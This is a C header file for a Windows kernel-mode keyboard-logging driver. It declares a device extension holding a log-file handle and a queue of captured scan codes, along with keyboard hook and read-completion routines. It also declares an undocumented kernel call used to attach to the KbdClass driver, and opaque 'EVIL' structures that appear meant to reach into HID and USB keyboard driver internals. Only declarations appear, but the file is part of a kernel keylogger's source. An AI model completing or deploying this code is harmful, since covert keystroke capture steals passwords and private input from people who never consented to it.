#ifndef __Driver_h__ 
#define __Driver_h__ 
#include <hidpddi.h>
#include <wmilib.h>

#include <wdf.h>
#include <wdmsec.h> // for SDDLs
#define NTSTRSAFE_LIB
#include <ntstrsafe.h>

typedef struct _EVIL_EXTENSION {
	PVOID pointer0;
	PVOID pointer1;
	PVOID pointer2;
	PVOID pointer3;
	ULONG data0;
	ULONG data1;
	ULONG data2;
	ULONG data3;
	PVOID pointer4;
	PVOID pointer5;
	ULONG data4;
	ULONG data5;
	ULONG data6;
	ULONG data7;
	ULONG data8;
	PVOID pointer6;
	PVOID pointer7;
	PVOID pointer8;
	PVOID pointer9;
	ULONG data9;
	ULONG data10;
	ULONG data11;
	ULONG data12;
	ULONG data13;
	ULONG data14;
	ULONG data15;
	ULONG data16;
	ULONG data17;
	PVOID pointer10;
	PVOID pointer11;
	ULONG data18;
	ULONG data19;
	ULONG data20;
	ULONG data21;
	ULONG data22;
	PVOID pointer12;
	PVOID pointer13;
	PVOID pointer14;
	PVOID pointer15;
	PVOID pointer16;
	ULONG data23;
	ULONG data24;
	ULONG data25;
	ULONG data26;
	ULONG data27;
	ULONG data28;
	ULONG data29;
	ULONG data30;
	ULONG data31;
	PVOID pointer17;
	ULONG data32;
	ULONG data33;
	ULONG data34;
	ULONG data35;
	ULONG data36;
	ULONG data37;
} EVIL_EXTENSION, *PEVIL_EXTENSION;

typedef struct _EVIL_LOOK {
	ULONG data0;
	ULONG data1;
	ULONG data2;
	ULONG data3;
	ULONG data4;
	ULONG data5;
	ULONG data6;
	ULONG data7;
	ULONG data8;
	ULONG data9;
	ULONG data10;
	ULONG data11;
	ULONG data12;
	ULONG data13;
	ULONG data14;
	ULONG data15;
	ULONG data16;
	ULONG data17;
	ULONG data18;
	ULONG data19;
	ULONG data20;
	ULONG data21;
	ULONG data22;
	ULONG data23;
	ULONG data24;
	ULONG data25;
	ULONG data26;
	ULONG data27;
	ULONG data28;
	ULONG data29;
	ULONG data30;
	ULONG data31;
} EVIL_LOOK, *PEVIL_LOOK;

typedef struct _USBK_DATA {
	PVOID pointer0;
	PVOID pointer1;
	ULONG long0;
	ULONG long1;
	ULONG long2;
	PVOID pointer2;
	PVOID pointer3;
	ULONG long3;
	PVOID pointer4;
	PVOID pointer5;
	ULONG long4;
	ULONG long5;
	ULONG long6;
	ULONG long7;
	ULONG long8;
	PVOID pointer6;
	PVOID pointer7;
	ULONG long9;
	ULONG longA;
	ULONG longB;
	ULONG longC;
	ULONG longD;
	PVOID pointer8;
	PVOID pointer9;
	ULONG longE;
	ULONG longF;
	ULONG long10;
	PVOID pointerA;
	PVOID pointerB;
	ULONG buffer;
} USBK_DATA, *PUSBK_DATA;


typedef struct _USBK_EXT {
	PVOID pointer0;
	PVOID pointer1;
	PVOID pointer2;
	ULONG long0;
	ULONG long1;
	ULONG long2;
	ULONG long3;
	PVOID pointer3;
	PVOID pointer4;
	ULONG long4;
	ULONG long5;
	PVOID pointer5;
	PUSBK_DATA dataPointer;
} USBK_EXT, *PUSBK_EXT;

typedef BOOLEAN BOOL;
///////////////////////// 
// STRUCTURES 
//////////////////////// 
/**/
typedef struct KEY_STATE
{
	int kSHIFT; //if the shift key is pressed  
	int kCAPSLOCK; //if the caps lock key is pressed down 
	int kCTRL; //if the control key is pressed down 
	int kALT; //if the alt key is pressed down 
}  KEY_STATE;
/**/

//Instances of the structure will be chained onto a  
//linked list to keep track of the keyboard data 
//delivered by each irp for a single pressed key 
/** /
typedef struct KEY_DATA
{
LIST_ENTRY ListEntry;
char KeyData;
char KeyFlags;
} KEY_DATA;
/**/

/**/
typedef struct _KLOG_DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; //pointer to next keyboard device on device stack 
	PETHREAD pThreadObj;			//pointer to the worker thread 
	//PETHREAD pMemoryThreadObj;			//pointer to the worker thread 
	int bThreadTerminate;		    //thread terminiation state 
	HANDLE hLogFile;				//handle to file to log keyboard output 
	KEY_STATE kState;				//state of special keys like CTRL, SHIFT, ect 

	//The work queue of IRP information for the keyboard scan codes is managed by this  
	//linked list, semaphore, and spin lock 
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
	//PIRP pirp;
	//PKEYBOARD_INPUT_DATA keyboard_input_data;
	//PDEVICE_OBJECT pKeyboardDeviceObject;
}
KLOG_DEVICE_EXTENSION, *PKLOG_DEVICE_EXTENSION;
/**/


////////////////////////////////////
// KBDHID Structures (from winCE) //
////////////////////////////////////
typedef void *LPVOID;
typedef LPVOID HID_HANDLE;
typedef struct _HID_FUNCS const * PCHID_FUNCS;
enum AutoRepeatState {
	AR_WAIT_FOR_ANY = 0,
	AR_INITIAL_DELAY,
	AR_AUTOREPEATING,
};
typedef UINT32 KEY_STATE_FLAGS;
typedef struct _HID_KBD {
	DWORD dwSig;
	HID_HANDLE hDevice;
	PCHID_FUNCS pHidFuncs;
	PHIDP_PREPARSED_DATA phidpPreparsedData;
	HIDP_CAPS hidpCaps;
	HANDLE hThread;
	HANDLE hOSDevice;
	HANDLE hevClosing;

	DWORD dwMaxUsages;
	KEY_STATE_FLAGS KeyStateFlags;
	PUSAGE_AND_PAGE puapPrevUsages;
	PUSAGE_AND_PAGE puapCurrUsages;
	PUSAGE_AND_PAGE puapBreakUsages;
	PUSAGE_AND_PAGE puapMakeUsages;
	PUSAGE_AND_PAGE puapOldMakeUsages;

	PCHAR  pbOutputBuffer;
	USHORT cbOutputBuffer;

} HID_KBD, *PHID_KBD;
// FIN



/** /
typedef struct _PTE
{
	ULONG Present : 1;
	ULONG Writable : 1;
	ULONG Owner : 1;
	ULONG WriteThrough : 1;
	ULONG CacheDisable : 1;
	ULONG Accessed : 1;
	ULONG Dirty : 1;
	ULONG LargePage : 1;
	ULONG Global : 1;
	ULONG ForUse1 : 1;
	ULONG ForUse2 : 1;
	ULONG ForUse3 : 1;
	ULONG PageFrameNumber : 20;
} PTE, *PPTE;
/**/


//////////////////////////////////////////////////////////
// Undocumented Kernel calls to get the KbdClass driver //
//////////////////////////////////////////////////////////
NTKERNELAPI
NTSTATUS
ObReferenceObjectByName(IN PUNICODE_STRING ObjectName, IN ULONG Attributes, IN PACCESS_STATE PassedAccessState OPTIONAL, IN ACCESS_MASK DesiredAccess OPTIONAL, IN POBJECT_TYPE ObjectType, IN KPROCESSOR_MODE AccessMode, IN OUT PVOID ParseContext OPTIONAL, OUT PVOID * Object);
extern POBJECT_TYPE IoDeviceObjectType;
extern POBJECT_TYPE ObGetObjectType(PVOID Object);





/////////////////////////////////////////
// Struct and setup for Control Device //
/////////////////////////////////////////

_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject);

_IRQL_requires_max_(DISPATCH_LEVEL)
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

_IRQL_requires_max_(DISPATCH_LEVEL)
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context);

_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath);

_IRQL_requires_max_(PASSIVE_LEVEL)
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

_IRQL_requires_max_(PASSIVE_LEVEL)
VOID Unload(IN PDRIVER_OBJECT pDriverObject);






#endif


